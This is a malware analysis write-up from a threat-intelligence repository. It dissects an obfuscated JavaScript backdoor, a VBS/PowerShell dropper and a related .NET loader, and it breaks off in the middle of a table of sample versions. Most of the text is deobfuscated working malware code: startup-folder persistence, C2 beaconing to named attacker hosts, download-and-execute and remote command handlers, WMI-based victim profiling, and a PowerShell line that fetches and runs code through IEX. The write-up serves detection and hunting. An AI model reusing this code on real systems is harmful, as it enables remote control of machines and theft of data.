## Obfuscation 101
## Table of Contents
* [Malware analysis](#Malware-analysis)
* [Hunting](#Hunting)
* [Cyber kill chain](#Cyber-kill-chain)
* [Indicators Of Compromise (IOC)](#IOC)
* [References MITRE ATT&CK Matrix](#Ref-MITRE-ATTACK)
* [Links](#Links)
  + [Original Tweet](#tweet)
  + [Link Anyrun](#Links-Anyrun)

<h2>Malware analysis <a name="Malware-analysis"></a></h2>
<h6>The initial vector is a JavaScript script probably extracted from an executable archive reported by <a href="https://twitter.com/Racco42">Racco42</a> in reply of the original tweet of <a href="https://twitter.com/malwrhunterteam">malwrhunterteam</a>. As first, we can note that declare the future variable for the second layer, then this use a custom algorithm for decrypt the strings of the last part of the code.</h6>

```js
var version,server,interval,attemptsCount,status,wss,defaultPath,scriptFullPath,scriptName,fakeAutorunName,shellObj,clientInfo,SendClientInfo,SendKnock,SendTaskResult,DoTasks,Execute,GetFilenameFromURL,DownloadAndExecute,ExecuteAndOutput,GetClientInfo,AddToAutorun,ImportJSON;

function()
{
 function Decrypt(e)
 {
  var j=1503701;
  var o=e.length;
  var y=[];
  for(var p=0;p<o;p++){y[p]=e.charAt(p)};
  for(var p=0;p<o;p++)
  {
   var x=j*(p+118)+(j%47008);
   var c=j*(p+699)+(j%34302);
   var z=x%o;
   var b=c%o;
   var a=y[z];
   y[z]=y[b];
   y[b]=a;
   j=(x+c)%4703074;
  };
  return y.join('');
 };
```
<h6>Once this done, this uses the constructor of the function for create an object which decrypts the second pass of obfuscated code of the second layer and execute it.</h6>

```js
var hbJ=Decrypt["constructor"];
var Zft=hbJ;
var hCM=hbJ('','var b=11,v=22,h=40;var k="abcdefghijklmnopqrstuvwxyz"; [...] return u.split(p+"!").join(p);');
var pRr=hCM(Decrypt('esnnJ*JsAe).csethJnqJAelAd.ieU,tigY.d [...] oJk0O3i\/a.ii)uarq\/9]E0w.a" AA 4'));
var WGL=Zft(vbR,pRr );
WGL(8225);
return 4799;
}()
```

<h6>This function is pretty strong in using the variation of elements in several arrays, arithmetic operations and conversions int to char for getting the data, this parse for the number of characters pushed on the argument of the function. </h6>

```js
var b=11,v=22,h=40;
var k="abcdefghijklmnopqrstuvwxyz";
var n=[65,74,82,85,86,81,88,89,94,66,79,70,60,80,72,75,87,76,71,90];
var a=[];
for(var f=0;f<n.length;f++)a[n[f]]=f+1;
var z=[];
b+=22;
v+=71;
h+=56;
for(var g=0;g<arguments.length;g++)
{
 var i=arguments[g].split(" ");
 for(var r=i.length-1;r>=0;r--)
 {
  var l=null;
  var s=i[r];
  var d=null;
  var m=0;
  var j=s.length;
  var q;
  for(var e=0;e<j;e++)
  {
   var t=s.charCodeAt(e);
   var y=a[t];
   if(y)
   {
    l=(y-1)*v+s.charCodeAt(e+1)-b;
    q=e;
    e++;
   }
   else if(t==h)
   {
    l=v*(n.length-b+s.charCodeAt(e+1))+s.charCodeAt(e+2)-b;
    q=e;
    e+=2;
   }
   else{continue;}
   if(d==null)d=[];
   if(q>m)d.push(s.substring(m,q));
   d.push(i[l+1]);
   m=e+1;
  }
  if(d!=null)
  {
   if(m<j)d.push(s.substring(m));
   i[r]=d.join("");
  }
 }
 z.push(i[0]);
}
var u=z.join("");
var w=[32,10,39,92,42,96].concat(n);
var p=String.fromCharCode(46);
for(var f=0;f<w.length;f++)u=u.split(p+k.charAt(f)).join(String.fromCharCode(w[f]));
return u.split(p+"!").join(p);
```

<h6>The first block of the second stager add the persistence, load the JSON parser, content the configuration of the backdoor and run the loop send a pulse to the C2.We can note that a name of the persistence is defined but not used on persistence function, that let to think to a name of task schedule or key for registry. Same comment can be made on the scriptname that not used on the script too.</h6>

```js
if(Execute == null){AddToAutorun(false,null,1);SendTaskResult= false};
if(!SendTaskResult){DownloadAndExecute();SendTaskResult= 1;return};
if(!Execute){return};
if(GetFilenameFromURL== null){return}
else {ImportJSON= LoadJsonParser};
version= "Test7";
if(LoadJsonParser=== null){DownloadAndExecute(null);return};
server= "https://softcheck3u.biz/inc/server/gate.php";
interval= 181;
attemptsCount= 5;
status= "Active";
if(DoTasks== false)
{
 SendTaskResult(false,null,null);
 SendTaskResult= true
};
wss =  new ActiveXObject('WScript.Shell');
defaultPath= wss.ExpandEnvironmentStrings('%APPDATA%');
scriptFullPath= WScript.ScriptFullName;
scriptName= WScript.ScriptName;
fakeAutorunName= "MicrosoftOneDrive";
if(GetClientInfo== false)
{
 SendTaskResult();
 AddToAutorun= false
};
shellObj= WScript.createObject("WScript.Shell");
LoadJsonParser();
clientInfo= GetClientInfo();
AddToAutorun();
while(status== "Active")
{
 DoTasks(SendClientInfo());
 WScript.sleep(interval* 1000);
 DoTasks(SendKnock());
};
if(!GetClientInfo)
{
 GetFilenameFromURL();
 ExecuteAndOutput= 1;
 return;
}
else {};
if(!SendClientInfo){return}
else {};
if(!GetFilenameFromURL){SendClientInfo(true)}
else {};
if(!DoTasks)
{
 SendClientInfo(1);
 GetClientInfo= 1;
};
```

<h6>The following block show that the persistence method is only to push the file to startup folder as the persistence. The second function uses the parser loaded for parse the orders received as JSON on the response of the C2. We can note that has a number of tries for connecting to the C2 else this exit.</h6>

```js
function AddToAutorun()
 {
  try
  {
   startupPath= defaultPath+ '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\';
   fsObj= WScript.CreateObject('Scripting.FileSystemObject');
   fsObj.CopyFile(scriptFullPath,startupPath)
  }
  catch(err){return}
 }

 function DoTasks(tasksJson)
 {
  if(tasksJson.length< 5)
  {
   if(DownloadAndExecute== true){return;};
   return;
  };
  var result='False';
  var attempts=0;
  var details="";
  try{tasks= JSON.parse(tasksJson)} 
  catch(err){return};
  if(!AddToAutorun){GetFilenameFromURL= 1}
  else 
  {
   for(var task in tasks)
   {
    result= 'False';
    attempts= attemptsCount;
    details= "";
    if(DoTasks=== 1){return}
    else 
    {
     while((attempts> 0)&& (result!= 'True'))
     {
      if(GetFilenameFromURL=== 0){SendTaskResult();return};
      switch(tasks[task]["type"])
      {
       case "Download & Execute":result= DownloadAndExecute(tasks[task]["content"]);
        if(result== 'False'){details= "Error: download or executing file failed"};
        break;
       case "Execute":result= Execute(tasks[task]["content"]);
        if(result== 'False'){details= "Error: executing file failed"};
        if(!DoTasks){DownloadAndExecute();LoadJsonParser= 1;return};
        break;
       case "Terminate":status= "Stopped";
        if(!LoadJsonParser){DownloadAndExecute();GetClientInfo= false};result= 'True';
        if(!DownloadAndExecute){GetFilenameFromURL(null);return};
        break;
       default:result= 'False';
        details= "Error: unknown task type";
        break;
      };
      if(result== 'False'){attempts--}
      else 
      {
       if(!SendKnock){AddToAutorun()}
       else {details= "Success"}
      };
      SendTaskResult(tasks[task]["id"],result,details)
     }
    }
   }
  }
 }
```

<h6>We can list all the commands on the following array:</h6>
<center>
<h6>
<table>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
<tr>
<td>Download & Execute</td>
<td>Download a file and execute it</td>
</tr>
</tr>
<tr>
<td>Execute</td>
<td>Execute a command on prompt on the compromissed system</td>
</tr>
<tr>
<td>Terminate</td>
<td>Kill the loop and stop the process</td>
</tr>
</table>
</h6>
</center>

<h6>The next functions show the JSON structure used for the response to the C2. On the first contact to the C2, this load the JSON parser and init the operation for collecting the system information of the victim. The last function is used as reply of the result to the operation given by C2.</h6>

```js
function SendClientInfo()
 {
  var response;
  try
  {
   var WinHttpReq= new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   var temp=WinHttpReq.Open("POST",server,false);
   WinHttpReq.SetRequestHeader("Content-Type","application/json");
   WinHttpReq.SetRequestHeader("mode","info");
   WinHttpReq.SetRequestHeader("uuid",clientInfo["uuid"]);
   WinHttpReq.SetRequestHeader("version",version);
   WinHttpReq.Send(JSON.stringify(clientInfo));
   WinHttpReq.WaitForResponse();
   response= WinHttpReq.ResponseText;
  }
  catch(objError)
  {
   response= objError+ "\x0A";
   response+= "WinHTTP returned error: "+ (objError.number& 0xFFFF).toString()+ "\x0A\x0A";
   response+= objError.description;
  };
  return response
 }

 function SendKnock()
 {
  var response;
  if(GetClientInfo== true){return};
  try
  {
   var WinHttpReq= new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   var temp=WinHttpReq.Open("POST",server,false);
   if(DownloadAndExecute=== null){return};
   WinHttpReq.SetRequestHeader("Accept","application/json");
   WinHttpReq.SetRequestHeader("mode","knock");
   WinHttpReq.SetRequestHeader("uuid",clientInfo["uuid"]);
   WinHttpReq.SetRequestHeader("version",version);
   WinHttpReq.Send();
   WinHttpReq.WaitForResponse();
   response= WinHttpReq.ResponseText;
  }
  catch(objError)
  {
   if(!GetFilenameFromURL){ LoadJsonParser(null,null,null,1,0)};
   response= objError+ "\x0A";
   response+= "WinHTTP returned error: "+ (objError.number& 0xFFFF).toString()+ "\x0A\x0A";
   response+= objError.description
  };
  if(DoTasks== 0){SendTaskResult= 1;return};
  return response;
 }

 function SendTaskResult(taskID,result,details)
 {
  var response;
  try
  {
   var WinHttpReq= new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   var temp=WinHttpReq.Open("POST",server,false);
   WinHttpReq.SetRequestHeader("Accept","application/json");
   WinHttpReq.SetRequestHeader("mode","task");
   if(!SendTaskResult){LoadJsonParser= 1;return}
   else {WinHttpReq.SetRequestHeader("uuid",clientInfo["uuid"])};
   WinHttpReq.SetRequestHeader("taskID",taskID);
   WinHttpReq.SetRequestHeader("result",result);
   WinHttpReq.SetRequestHeader("details",details);
   WinHttpReq.Send();
   WinHttpReq.WaitForResponse();
   response= WinHttpReq.ResponseText;
  }
  catch(objError)
  {
   response= objError+ "\x0A";
   response+= "WinHTTP returned error: "+ (objError.number& 0xFFFF).toString()+ "\x0A\x0A";
   response+= objError.description
  }
 }
```

<h6>The next function shows the details of the download and execution methods (by cmd or run call).</h6>

```js
 function Execute(command)
 {
  try
  {
   shellObj.run("%comspec% /c "+ command,0,true);
   return 'True';
  }
  catch(err){return 'False'}
 }
 function GetFilenameFromURL(url)
 {
  var filename=url.split('/')[url.split('/').length- 1];
  if(!AddToAutorun){return}
  else {return filename}
 }

 function DownloadAndExecute(url)
 {
  var filename=GetFilenameFromURL(url);
  var saveTo=defaultPath+ '\\'+ filename;
  var WinHttpObj=WScript.CreateObject("WinHttp.WinHttpRequest.5.1");
  if(ExecuteAndOutput== 1){SendClientInfo()};
  try
  {
   WinHttpObj.open("GET",url,false);
   if(!AddToAutorun){SendTaskResult()};
   WinHttpObj.setRequestHeader("cache-control","max-age=0");
   WinHttpObj.send();
   var fsObj=WScript.CreateObject("Scripting.FileSystemObject");
   if(fsObj.fileExists(saveTo)){fsObj.deleteFile(saveTo)};
   if(WinHttpObj.status== 200)
   {
    var streamObj=WScript.CreateObject("ADODB.Stream");
    streamObj.Type= 1;
    if(!SendClientInfo){return};
    streamObj.Open();
    streamObj.Write(WinHttpObj.responseBody);
    streamObj.SaveToFile(saveTo);
    streamObj.close();
    if(!SendClientInfo){return};
    streamObj= null
   };
   if(fsObj.fileExists(saveTo)){shellObj.run(fsObj.getFile(saveTo).shortPath); return 'True'}
  }
  catch(err){return 'False'};
  return 'False';
 }

 function ExecuteAndOutput(command)
 {
  var fso= new ActiveXObject("Scripting.FileSystemObject");
  var wshShell= new ActiveXObject("WScript.Shell");
  do{var tempName=fso.BuildPath(fso.GetSpecialFolder(2),fso.GetTempName())}
  while(fso.FileExists(tempName));;
  var cmdLine=fso.BuildPath(fso.GetSpecialFolder(1),"cmd.exe")+ ' /C '+ command+ ' > \"'+ tempName+ '\"';
  wshShell.Run(cmdLine,0,true);
  var result="";
  try
  {
   var ts=fso.OpenTextFile(tempName,1,false);
   result= ts.ReadAll();
   ts.Close();
  }
  catch(err){};
  return result;
 }
```

<h6>The following function shows how the collect of system informations is performed, this checks the internal reference in using WMI object by ActiveX and check the JSON response on from the ipinfo website in json and parse the result on the JSON for be sending to the C2.</h6>

```js

 function GetClientInfo()
 {
  var initInfo= new Object();
  try
  {
   var wmi=GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
   for(var i= new Enumerator(wmi.ExecQuery("SELECT * FROM Win32_ComputerSystemProduct"));!i.atEnd();i.moveNext()){initInfo["uuid"]= i.item().UUID}
  }
  catch(err){initInfo["uuid"]= 'N/A'};
  if(!DownloadAndExecute){GetFilenameFromURL= null};
  try
  {
   var ipReq= new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   ipReq.Open("GET","http://ipinfo.io/ip",false);
   if(LoadJsonParser=== 1){LoadJsonParser()};
   ipReq.Send();
   ipReq.WaitForResponse();
   ipRes= ipReq.ResponseText;
   initInfo["ip"]= ipRes.replace(/^\s+|\s+$/g,'')
  }
  catch(err){initInfo["ip"]= 'N/A'};
  try
  {
   var countryReq= new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   countryReq.Open("GET","http://ipinfo.io/country",false);
   countryReq.Send();
   countryReq.WaitForResponse();
   countryRes= countryReq.ResponseText;
   initInfo["location"]= countryRes.replace(/^\s+|\s+$/g,'')
  }
  catch(err)
  {
   if(!LoadJsonParser){return};
   initInfo["location"]= 'N/A';
  };
  if(SendClientInfo=== null){ExecuteAndOutput(0);SendKnock= false};
  try
  {
   for(var i= new Enumerator(wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem"));!i.atEnd();i.moveNext()){ initInfo["os"]= i.item().Caption; }
  }
  catch(err)
  {
   if(SendClientInfo=== 1){LoadJsonParser= null};
   initInfo["os"]= 'N/A';
  };
  try
  {
   var shellObj= new ActiveXObject("WScript.Shell");
   var netObj= new ActiveXObject("WScript.Network");
   if(!GetClientInfo){return};
   initInfo["user"]= netObj.ComputerName+ '/'+ shellObj.ExpandEnvironmentStrings("%USERNAME%");
  }
  catch(err){initInfo["user"]= 'N/A'};
  try
  {
   initInfo["role"]= "User";
   var groupObj=GetObject("WinNT://"+ netObj.UserDomain+ "/"+ shellObj.ExpandEnvironmentStrings("%USERNAME%"));
   for(propObj in groupObj.Members)
   {
    if(SendClientInfo=== false){DownloadAndExecute(null)};
    if(propObj.Name== "Administrators")
    {
     if(!DownloadAndExecute){DownloadAndExecute= 0;return};
     initInfo["role"]= "Admin"
    }
   }
  }
  catch(err){ initInfo["role"]= 'N/A'; };
  try
  {
   var wmiAV=GetObject("winmgmts:root\\SecurityCenter2");
   for(var i= new Enumerator(wmiAV.ExecQuery("SELECT * FROM AntivirusProduct"));!i.atEnd();i.moveNext()){ if(!initInfo["antivirus"]){initInfo["antivirus"]= i.item().displayName} }
  }
  catch(err){initInfo["antivirus"]= 'N/A'};
  try
  {
   for(var i= new Enumerator(wmi.ExecQuery("SELECT * FROM Win32_Processor"));!i.atEnd();i.moveNext()){ initInfo["cpu"]= i.item().Name}
  }
  catch(err){initInfo["cpu"]= 'N/A'; };
  if(!ExecuteAndOutput){return};
  try
  {
   if(AddToAutorun== null){Execute(0);SendClientInfo= 0;return}
   else 
   {
    for(var i= new Enumerator(wmi.ExecQuery("SELECT * FROM Win32_VideoController"));!i.atEnd();i.moveNext()){if(SendTaskResult== 1){return};
    initInfo["gpu"]= i.item().Name}
   }
  }
  catch(err){initInfo["gpu"]= 'N/A';};
  try
  {
   var ramObj=WScript.CreateObject("Shell.Application");
   initInfo["ram"]= Math.round(ramObj.GetSystemInformation("PhysicalMemoryInstalled")/ 1048576)+ ' MB';
  }
  catch(err)
  {
   if(GetClientInfo=== null){SendClientInfo(false,1,0) };
   initInfo["ram"]= 'N/A';
  };
  if(ExecuteAndOutput=== true){ExecuteAndOutput= false};
  try
  {
   var available=0;
   var total=0;
   for(var i= new Enumerator(wmi.ExecQuery("SELECT * FROM Win32_LogicalDisk"));!i.atEnd();i.moveNext())
   {
    if(DoTasks=== null){DownloadAndExecute(null);LoadJsonParser= null};
    if(i.item().Size!= null)
    {
     available+= (i.item().FreeSpace/ 1024/ 1024/ 1024);
     total+= (i.item().Size/ 1024/ 1024/ 1024)
    }
   };
  initInfo["storage"]= Math.round(available)+ ' / '+ Math.round(total)+ ' GB';
  }
  catch(err){initInfo["storage"]= '0 / 0 GB';};
  try
  {
   var pcs=0;
   var output=ExecuteAndOutput("net view");
   var lines=output.split('\x0A');
   if(lines.length> 6) {pcs= lines.length- 6};
   initInfo["network"]= pcs;
  }
  catch(err){initInfo["network"]= '0'};
  if(SendTaskResult=== null){GetFilenameFromURL();SendClientInfo= null;return};
  initInfo["version"]= version;
  return initInfo
 }
 ```

 <h6>The final function is the parser that a js script downloaded from a legit account (repository created in 2010). This is use the fact or the legit website like github for bypass the blacklist.</h6>

 ```js
 function LoadJsonParser()
 {
  var xObj=WSH.CreateObject('Microsoft.XMLHTTP'),fso=WSH.CreateObject('Scripting.FileSystemObject'),temp=WSH.CreateObject('WScript.Shell').Environment('Process')('temp'),j2lib='https://raw.githubusercontent.com/douglascrockford/JSON-js/master/json2.js';
  if(DownloadAndExecute=== null){GetClientInfo= false};
  if(fso.FileExists(temp+ '\\json2.js'))
  {
   j2lib= fso.OpenTextFile(temp+ '\\json2.js',1);
   eval(j2lib.ReadAll());
   j2lib.Close();
  }
  else 
  {
   with(xObj)
   {
    open("GET",j2lib,true);
    setRequestHeader('User-Agent','XMLHTTP/1.0');
    send('');
   };
   while(xObj.readyState!= 4){WSH.Sleep(50)};
   eval(xObj.responseText);
   if(GetClientInfo=== 1){LoadJsonParser= 0;return};
   j2lib= fso.CreateTextFile(temp+ '\\json2.js',true);
   j2lib.Write(xObj.responseText);
   j2lib.Close()
  }
 }
```

<h6>Now if we compare with the original js script found by the malwarehunterteam, we can see that the obfuscation is different and use the elements of an array for does the obfuscation on one layer. A different version is used on this sample.</h6>

<center><img src ="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional Analysis/Unknown/2020-05-12/Pictures/comp_code.png"></img></center>

<h2>Hunting<a name="Hunting"></h2>
<h6>In seeing the common elements, we can note that both use the common external code in downloading from github for getting the JSON parser.The domains are recent on links on anyrun and are more oldest on Virustotal (VT). By this way, the interesting method is to have the hash of the code of the external script and see the relation on the malware or legit software that call on the sandbox of VT.</h6>

<h6>We see that the script wall called on multiple JS files and PE files (and some file type errors), one file is excluding and use only the repository for have a JSON parser of the results the net implant to the C2. This also more old than the others (2014).The numbers of the samples using in downloading is low and will show improvement over time.</h6>

<center><img src ="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional Analysis/Unknown/2020-05-12/Pictures/hunting.png"></img></center>

<h6>A detailed list of samples using this repository can be viewed <a href="">here</a></h6>

<h6>We can note that the code has the same structure and method for collecting the informations, the orders to execute. Here we can see that the commands and the same typing in the URL of the C2 are the same. By looking at all the samples, the code is reduced only to improve its obfuscation. The most older sample have just as obfuscation the fact to use the elements on an array, the rest of the code is clear.</h6>

<h6>The initial vector founded is Visual Basic script probably by archive executable (SFX). This replaces the characters, reverse the content and convert to ascii. This script uses reflective method for download and executes the content in memory. This spawned by WMI instance for create the process.</h6>

```vb
f="g|)DHJ6TSHGLKHD75SBHDF$(gnirtSteG.IICSA::]gnidocnE.txeT.metsyS[;nor$ g las;)'I','D'(ecalper.'XED'=nor$;)#_#^4,20#_#^,63 [...] #_#^#_#^,00#_#^(@=DHJ6TSHGLKHD75SBHDF$"
f=replace(f,"#_#^","1")

'$FDHBS57DHKLGHST6JHD=@(100,111,32,123,36,112,105,110,103 [...] 100,46,101,120,101,39,44,36,102,41);

'$ron='DEX'.replace('D','I');
'sal g $ron;
'[System.Text.Encoding]::ASCII.GetString($FDHBS57DHKLGHST6JHD)|g

'do {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);
'[void] [System.Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');
'$fj=[Microsoft.VisualBasic.Interaction]::CallByname((New-Object Net.WebClient),'DownloadString',[Microsoft.VisualBasic.CallType]::Method,'http://sisse.site/l/r.jpg')|IEX;
'[Byte[]]$f=[Microsoft.VisualBasic.Interaction]::CallByname((New-Object Net.WebClient),'DownloadString',[Microsoft.VisualBasic.CallType]::Method,'http://sisse.site/l/1.jpg').replace('@$&~!','0x')|IEX;
'[jokeme]::Booo('notepad.exe',$f)

exec("Powershell"+space(1)+StrReverse(f))
set fso0 = CreateObject("Scripting.FileSystemObject")
CurrentDirectory = fso0.GetParentFolderName(WScript.ScriptFullName)
sname= wsh.scriptname
sub exec(Atc)
strCommand = Atc
Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set objStartup = objWMIService.Get("Win32_ProcessStartup")
Set objConfig = objStartup.SpawnInstance_
objConfig.ShowWindow = 0
Set objProcess = objWMIService.Get("Win32_Process")
intReturn = objProcess.Create(strCommand, Null, objConfig, intProcessID)
End sub

Set objFSO = CreateObject("Scripting.FileSystemObject")
objFSO.DeleteFile WScript.ScriptFullName
WScript.Quit()
```

<h6>Inside, we see that the commands possible on the backdoor are the same too, this uses a flag as condition of the connection to C2.</h6>

```csharp
try
{
 Dictionary<string, string> dictionary = Loader.JsonParse(json);
 HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(Loader.server);
 httpWebRequest.Headers.Add("UUID", Loader.GetUUID());
 httpWebRequest.Headers.Add("Completed", dictionary["TaskID"]);
 httpWebRequest.Method = "POST";
 bool flag = false;
 string text = dictionary["Type"];
 if (text != null)
 {
  if (text == "Download & Execute")
  {
   flag = Loader.Download(Loader.defaultPath, dictionary["Content"]);
   Console.WriteLine(string.Concat(new object[] { "DL <", dictionary["Content"], "> result: ", flag }));
   if (flag) { flag = Loader.Run(Loader.defaultPath, Loader.GetFilenameFromURL(dictionary["Content"])); }
   goto flag_C2;
  }
  if (text == "Execute")
  {
   flag = Loader.Execute(dictionary["Content"]);
   goto flag_C2;
  }
  if (text == "Download")
  {
   flag = Loader.Download(Loader.defaultPath, dictionary["Content"]);
   goto flag_C2;
  }
  if (text == "Terminate")
  {
   Loader.terminate = true;
   flag = Loader.terminate;
   goto flag_C2;
  }
  if (text == "Autorun") { goto flag_C2; }
 }
 flag = false;
 flag_C2:
 if (flag)
 {
  HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
  StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
  string text2 = streamReader.ReadToEnd();
 }
 else
 {
  httpWebRequest.Headers.Add("Error", "true");
  HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
 }
}
catch{Console.WriteLine("[INFO] No Available Tasks");}
```

<h6>On the global variables a different version name is also present, and persistence is not properly defined and depends on whether the attacker deems it necessary to add it, this on the stream of data that this performed.</h6>

```cs
public static string version = "Dorway";
public static string server = "http://sissj.space/8/gate.php";
public static string defaultPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
public static bool terminate = false;
public static int interval = 240;
```

<h6>In more to have the same names of variables and functions, this use the same method for collecting the system informations by WMI requests.</h6>

```cs
public static string GetInitInfo()
{
 string text = string.Empty;
 text = text + "{\"UUID\":\"" + Loader.GetUUID() + "\",";
 text = text + "\"IP\":\"" + new WebClient().DownloadString("http://ipinfo.io/ip").Trim() + "\",";
 text = text + "\"Country\":\"" + new WebClient().DownloadString("http://ipinfo.io/country").Trim() + "\",";
 using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get().GetEnumerator())
 {
  if (enumerator.MoveNext())
  {
   ManagementObject managementObject = (ManagementObject)enumerator.Current;
   text = text + "\"OS\":\"" + ((managementObject["Caption"] != null) ? managementObject["Caption"].ToString().Replace("Microsoft ", "") : "N/A") + "\",";
  }
 }
 using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("select * from Win32_Processor").Get().GetEnumerator())
 {
  if (enumerator.MoveNext())
  {
   ManagementObject managementObject2 = (ManagementObject)enumerator.Current;
   text = text + "\"Arch\":\"x" + Convert.ToInt32(managementObject2["AddressWidth"]).ToString() + "\",";
  }
 }
 text = text + "\"User\":\"" + WindowsIdentity.GetCurrent().Name.Replace("\\", "/").ToString() + "\",";
 text = text + "\"CPU\":\"" + Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM\\CENTRALPROCESSOR\\0", "ProcessorNameString", null).ToString() + "\",";
 ulong totalPhysicalMemory = new ComputerInfo().TotalPhysicalMemory;
 text = text + "\"RAM\":\"" + (totalPhysicalMemory / 1024UL / 1024UL).ToString() + " MB\",";
 WindowsIdentity current = WindowsIdentity.GetCurrent();
 WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
 bool flag = windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
 if (flag){text += "\"Role\":\"Admin\",";}
 else{text += "\"Role\":\"User\",";}
 try
 {
  string text2 = string.Empty;
  foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntivirusProduct").Get())
  {
   ManagementObject managementObject3 = (ManagementObject)managementBaseObject;
   text2 = managementObject3["displayName"].ToString();
  }
  if (text2.Length < 2){text += "\"AntiVirus\":\"N/A\",";}
  else{text = text + "\"AntiVirus\":\"" + text2 + "\",";}
 }
 catch{text += "\"AntiVirus\":\"N/A\",";}
 long num = 0L;
 foreach (DriveInfo driveInfo in DriveInfo.GetDrives()){if (driveInfo.IsReady) {num += driveInfo.TotalSize;}}
 text = text + "\"Total Space\":\"" + (num / 1024L / 1024L / 1024L).ToString() + " GB\",";
 text = text + "\"Version\":\"" + Loader.version + "\",";
 List<string> list = new List<string>();
 using (DirectoryEntry directoryEntry = new DirectoryEntry("WinNT:"))
 {
  foreach (object obj in directoryEntry.Children)
  {
   DirectoryEntry directoryEntry2 = (DirectoryEntry)obj;
   foreach (object obj2 in directoryEntry2.Children)
   {
    DirectoryEntry directoryEntry3 = (DirectoryEntry)obj2;
    if (directoryEntry3.Name != "Schema"){list.Add(directoryEntry3.Name);}
   }
  }
 }
 if (list.Count == 0){text += "\"Network PCs\":\"N/A\"}";}
 else{text = text + "\"Network PCs\":\"" + list.Count.ToString() + "\"}";}
 Console.WriteLine(text);
 return text;
}
```

<h6>The full code of the .NET loader can be found <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Unknown/2020-05-12/code/modern_loader.cs">here</a>.</h6>

<h6>The first improvement on the obfuscation between the first JS script are to push the elements into arrays and use the fact that the elements can be managed natively in hexadecimal.</h6>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional Analysis/Unknown/2020-05-12/Pictures/obfuscation_hex.PNG"></center>

<h6>This executed and dropped by SFX archive. During the creation of the executable archive, Winrar use the language defined on the system in the arguments pushed in the archive, we can see that the attacker use a Russian operating system.</h6>

```
CMT;Расположенный ниже комментарий содержит команды SFX-сценария\r\n\r\nSetup=firefox.js\r\nTempMode\r\nSilent=1\r\nOverwrite=1\r\nUpdate=U\r\n
D:\\Projects\\WinRAR\\sfx\\build\\sfxrar32\\Release\\sfxrar.pdb
```

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional Analysis/Unknown/2020-05-12/Pictures/trad_command.png"></center>

<h6>This content an unused function which not optimized for stealth because displays the windows for the capture and the inputs can be parasitized by the victim. The fact that it also starts word seems to be an oversight in a copy and paste from a forum for example.</h6>

```js
function TakeScreenshot()
{
    var oWordBasic= new ActiveXObject("Word.Basic");
    oWordBasic.SendKeys("{prtsc}");
    WScript.Sleep(2000);
    var WshShell= new ActiveXObject("WScript.Shell");
    WshShell.SendKeys("{prtsc}");
    WshShell.Run("mspaint");
    WScript.Sleep(2000);
    WScript.Sleep(1000);
    WScript.Sleep(1000);
    WshShell.AppActivate("Paint");
    WScript.Sleep(5000);
    WshShell.SendKeys("^v");
    WScript.Sleep(500);
    WshShell.SendKeys("^s");
    WScript.Sleep(500);
    WshShell.SendKeys(defaultPath+ "\\"+ clientInfo["uuid"]+ ".jpg");
    WScript.Sleep(500);
    WshShell.SendKeys("{ENTER}");
}
```

<h6>On the recent samples from May 2020 samples, we can note the transition to the recent JS loader and all have the same function (previously shown) for decrypt the data of the first layer to the second layer but with different values that indicate that generated by a tool in using the variance of a common integer base for obfuscating these payloads.</h6>

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional Analysis/Unknown/2020-05-12/Pictures/comp_algo.png"></img></center>

<h6>Some versions of this script have an additional function for obfuscating the strings with different values too.</h6>

```js
var tab=(extract_strings)("aeeo1dtrsfsirn%cTtTnec/3Itoigpue%%iedrerrgtacekocsh%tine%aaiBnytiS%hgNnldn%  [...] ntlAtllai%DQp*lrWe.l%Slppto/e%2aeseroeg#f%lssk%%.lwHrbeloEeeeC\\re",118378);
function extract_strings(o,d)
{
  var lim=o.length;
  var t=[];
  for(var i=0;i< lim;i++){t[i]= o.charAt(i)};
  for(var i=0;i< lim;i++)
  {
   var a=d*(i+ 243)+(d% 39595);
   var b=d*(i+ 592)+(d% 32708);
   var c=a%lim;
   var e=b%lim;
   var s=t[c];
   t[c]=t[e];
   t[e]=s;
   d=(a+b)% 2572703;
  };
  return t.join('').split('%').join("^?").split('#1').join('%').split('#0').join('#').split("^?");
}
```

<center><img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional Analysis/Unknown/2020-05-12/Pictures/comp_algo2.png"></img></center>

<h6>We can list of versions found :</h6> 
<center><h6>
<table>
<tr>
<th>Date submission</th>
<th>Hash</th>
<th>Name</th>
<th>Vector</th>
<th>Version</th>
</tr>
<tr>
  <td>2020-05-12 17:53:23</td>
  <td>7837e15bf4d38996a3d85cdb16f425c4ec9f110fae80bc774f875db6229f1d5a</td>
  <td><center>invoice_159306.js</center></td>
  <td><center>JS</center></td>
